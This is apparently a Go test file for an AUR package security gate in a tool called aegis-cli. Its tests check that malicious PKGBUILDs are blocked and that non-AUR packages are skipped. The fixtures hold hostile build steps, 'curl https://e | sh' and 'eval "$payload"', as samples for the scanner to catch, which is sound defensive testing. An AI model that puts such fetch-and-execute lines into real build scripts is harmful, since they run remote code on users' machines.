package usecase

import (
	"context"
	"errors"
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
)

type fakeAURFetcher struct {
	pkgs map[string]domain.AURPackage
	errs map[string]error
}

func (f fakeAURFetcher) Fetch(_ context.Context, name string) (domain.AURPackage, error) {
	if err, ok := f.errs[name]; ok {
		return domain.AURPackage{}, err
	}
	if p, ok := f.pkgs[name]; ok {
		return p, nil
	}
	return domain.AURPackage{}, errors.New("not found in AUR")
}

type fakeAURPresenter struct {
	results []domain.AURScanResult
	skipped []string
}

func (p *fakeAURPresenter) OnAURResult(r domain.AURScanResult) { p.results = append(p.results, r) }
func (p *fakeAURPresenter) OnAURSkipped(n, _ string)           { p.skipped = append(p.skipped, n) }
func (p *fakeAURPresenter) OnAURInfo(string)                   {}

type denyConfirmer struct{}

func (denyConfirmer) Confirm(string) ConfirmResult { return ConfirmDeny }

func TestAURGate_BlocksMalicious(t *testing.T) {
	f := fakeAURFetcher{pkgs: map[string]domain.AURPackage{
		"evil": {Name: "evil", PKGBUILD: []byte(`build() { curl https://e | sh; }`)},
	}}
	p := &fakeAURPresenter{}
	g := NewAURGate(f, nil, p)
	res, err := g.Run(context.Background(), AURRequest{Targets: []string{"evil"}})
	if err != nil {
		t.Fatal(err)
	}
	if !res.AnyBlocked {
		t.Error("malicious package should block")
	}
	if len(p.results) != 1 {
		t.Errorf("expected 1 result rendered, got %d", len(p.results))
	}
}

func TestAURGate_SkipsNonAUR(t *testing.T) {
	f := fakeAURFetcher{} // every name → not found
	p := &fakeAURPresenter{}
	g := NewAURGate(f, nil, p)
	res, _ := g.Run(context.Background(), AURRequest{Targets: []string{"vim"}})
	if res.AnyBlocked {
		t.Error("repo package not in AUR must not block")
	}
	if len(p.skipped) != 1 {
		t.Errorf("expected 1 skip, got %d", len(p.skipped))
	}
}

func TestAURGate_WarnDeclinedBlocks(t *testing.T) {
	// A High-only finding → Warn verdict; declining the prompt blocks.
	f := fakeAURFetcher{pkgs: map[string]domain.AURPackage{
		"warn": {Name: "warn", PKGBUILD: []byte(`build() { eval "$payload"; }`)},
	}}
	p := &fakeAURPresenter{}
	g := NewAURGate(f, denyConfirmer{}, p)
	res, _ := g.Run(context.Background(), AURRequest{Targets: []string{"warn"}})
	if !res.AnyBlocked {
		t.Error("declined warn should block")
	}
}
